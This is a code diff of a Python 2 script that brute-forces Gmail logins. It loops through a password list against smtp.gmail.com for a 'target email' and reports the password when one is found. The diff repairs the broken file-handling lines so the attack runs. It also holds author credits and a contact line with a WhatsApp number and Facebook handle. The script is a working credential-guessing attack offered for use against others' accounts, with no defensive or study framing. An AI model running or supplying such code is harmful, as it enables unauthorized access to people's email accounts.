@@ -1,3 +1,4 @@
+#          
 #!/usr/bin/python
 '''coded by ayoub sirai'''
 
@@ -6,7 +7,7 @@ from os import system
 
 def main():
    print '================================================='
-   print '               coded by Technical Naqeeb              '
+   print '               coded by Technical  Naqeeb     '
    print '================================================='
    print '               ++++++++++++++++++++              '
    print '\n                                               '
@@ -44,16 +45,16 @@ if option == 1:
 else:
    system('clear')
    exit()
-pass_file = open(Password list')
-pass_list = Password list.readlines()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
 def login():
     i = 0
     user_name = raw_input('enter the target email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
-    for password in Password.txt:
+    for password in pass_list:
       i = i + 1
-      print str(i) + '/' + str(len(Password.tx))
+      print str(i) + '/' + str(len(pass_list))
       try:
          server.login(user_name, password)
          system('clear')
@@ -72,6 +73,5 @@ def login():
          else:
             print '[!] password not found => ' + password
 login()
-  ' Contact On Whatapp     +923488136133
-   Facebook          www.facebook.com/Technical.naqeeb.133
-   
+Contact On Facebook                Technical.naqeeb.133
+Whatapp                                      +923488136133
